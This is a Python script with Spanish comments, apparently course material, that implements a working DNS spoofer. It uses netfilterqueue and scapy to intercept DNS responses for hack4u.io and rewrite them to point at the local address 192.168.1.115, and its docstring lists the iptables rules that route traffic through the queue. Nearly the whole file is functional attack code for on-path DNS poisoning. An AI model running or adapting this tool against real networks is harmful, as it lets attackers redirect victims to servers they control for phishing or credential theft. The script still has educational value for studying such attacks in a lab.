# /usr/bin/env python3
"""
DNS Spoofer

Se necesita instalar netfilterqueue:
pip3 install netfilterqueue

Para que funcione hay que redirigir el tráfico a la cola 0:
iptables -I INPUT -j NFQUEUE --queue-num 0
iptables -I OUTPUT -j NFQUEUE --queue-num 0
iptables -I FORWARD -j NFQUEUE --queue-num 0
iptables --policy FORWARD ACCEPT

Con esto no puedes navegar porque los paquetes están a la espera 
de ser procesados por netfilterqueue.

Para eliminar las anteriores reglas:
iptables -D INPUT -j NFQUEUE --queue-num 0
iptables -D OUTPUT -j NFQUEUE --queue-num 0
iptables -D FORWARD -j NFQUEUE --queue-num 0
iptables --policy FORWARD ACCEPT

"""

import netfilterqueue
import scapy.all as scapy
import signal
import sys


def def_handler(sig, frame):

    print('\n[!] Saliendo...\n')
    sys.exit(1)


signal.signal(signal.SIGINT, def_handler)


def process_packet(packet):
    """
    Procesa los paquetes que llegan a la cola 0
    """

    # El paquete en bruto lo tratamos como un paquete scapy para poder manipularlo
    scapy_packet = scapy.IP(packet.get_payload())

    # Filtramos los paquetes DNS por el puerto 53 y que tengan una capa DNSRR
    if scapy_packet.haslayer(scapy.DNSRR):

        # Obtenemos el nombre del dominio
        qname = scapy_packet[scapy.DNSQR].qname

        # Si el dominio es hack4u.io
        if b"hack4u.io" in qname:

            print(
                f"\n[+] Envenenando los dominios hack4u.io ...\n"
            )

            # Creamos un paquete DNSRR con el nombre del dominio
            # y la IP a la que queremos redirigir
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.115")

            # Modificamos el paquete DNS original con la respuesta que queremos
            scapy_packet[scapy.DNS].an = answer
            # Ponemos el número de respuestas a 1
            # (En este caso tenía 3 originalmente)
            scapy_packet[scapy.DNS].ancount = 1

            # Eliminamos los campos de longitud y checksum
            # para que scapy los recalcule
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(scapy_packet.build())

    packet.accept()

print(f"[+] Iniciando el envenenamiento de DNS ...")

queue = netfilterqueue.NetfilterQueue()

queue.bind(0, process_packet)

queue.run()
